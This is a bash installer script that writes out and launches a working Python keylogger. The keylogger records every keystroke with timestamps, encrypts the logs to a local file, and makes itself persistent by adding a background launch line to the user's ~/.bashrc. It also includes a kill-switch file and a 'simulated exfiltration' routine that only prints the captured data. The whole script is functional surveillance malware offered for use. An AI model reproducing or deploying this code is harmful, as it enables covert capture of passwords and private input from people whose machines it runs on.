#!/bin/bash

# === CONFIG ===
INSTALL_DIR="$HOME/keylogger_logs"
SCRIPT_PATH="$INSTALL_DIR/keylogger.py"
KEY_PATH="$INSTALL_DIR/secret.key"
BASHRC="$HOME/.bashrc"

echo "[+] Installing Python dependencies..."
sudo apt update
sudo apt install -y python3-pip
pip3 install --user pynput cryptography

echo "[+] Creating directory at $INSTALL_DIR"
mkdir -p "$INSTALL_DIR"

# === Create Python Keylogger ===
cat <<EOF > "$SCRIPT_PATH"
import os
import threading
from pynput import keyboard
from cryptography.fernet import Fernet
from datetime import datetime

LOG_DIR = os.path.expanduser("$INSTALL_DIR")
KEY_FILE = os.path.join(LOG_DIR, "secret.key")
LOG_FILE = os.path.join(LOG_DIR, "encrypted_log.txt")
KILL_FILE = os.path.join(LOG_DIR, "kill.txt")

os.makedirs(LOG_DIR, exist_ok=True)
log = ""

def generate_key():
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(key)

def load_key():
    return open(KEY_FILE, "rb").read()

def encrypt_data(data):
    key = load_key()
    f = Fernet(key)
    return f.encrypt(data.encode())

def save_encrypted_log(encrypted_log):
    with open(LOG_FILE, "ab") as f:
        f.write(encrypted_log + b"\\n")

def on_press(key):
    global log
    try:
        log += f"{datetime.now()} - {key.char}\\n"
    except AttributeError:
        log += f"{datetime.now()} - {key}\\n"

def flush_log():
    global log
    if log:
        encrypted = encrypt_data(log)
        save_encrypted_log(encrypted)
        log = ""
    threading.Timer(10, flush_log).start()

def check_kill_switch():
    if os.path.exists(KILL_FILE):
        print("[*] Kill switch activated.")
        os._exit(0)
    threading.Timer(5, check_kill_switch).start()

def simulate_exfiltration():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "rb") as f:
            data = f.read()
            print(f"[Simulated Exfiltration] Sending {len(data)} bytes...")
            print(data[:100], b"...")

if __name__ == "__main__":
    if not os.path.exists(KEY_FILE):
        generate_key()

    check_kill_switch()
    flush_log()
    simulate_exfiltration()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
EOF

echo "[+] Setting execute permissions"
chmod +x "$SCRIPT_PATH"

echo "[+] Adding keylogger to ~/.bashrc for startup"
if ! grep -Fxq "python3 $SCRIPT_PATH &" "$BASHRC"; then
    echo "python3 $SCRIPT_PATH &" >> "$BASHRC"
fi

echo "[+] Launching keylogger in background"
python3 "$SCRIPT_PATH" &

echo "[✔] Installation complete. Logs will be saved in $INSTALL_DIR"
echo "[✱] To stop the logger, create: touch $INSTALL_DIR/kill.txt"
